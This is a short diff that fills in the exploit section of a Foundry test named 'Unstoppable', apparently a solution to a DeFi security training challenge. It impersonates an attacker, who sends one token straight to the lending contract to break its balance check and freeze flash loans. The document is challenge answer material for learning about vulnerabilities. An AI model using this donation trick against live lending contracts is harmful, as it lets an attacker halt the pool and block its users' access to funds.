@@ -59,7 +59,13 @@ contract Unstoppable is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
+
          */
+      vm.startPrank(attacker);
+
+      dvt.transfer(address(unstoppableLender), 1);
+
+      vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -75,3 +81,6 @@ contract Unstoppable is Test {
         vm.stopPrank();
     }
 }
+
+
+
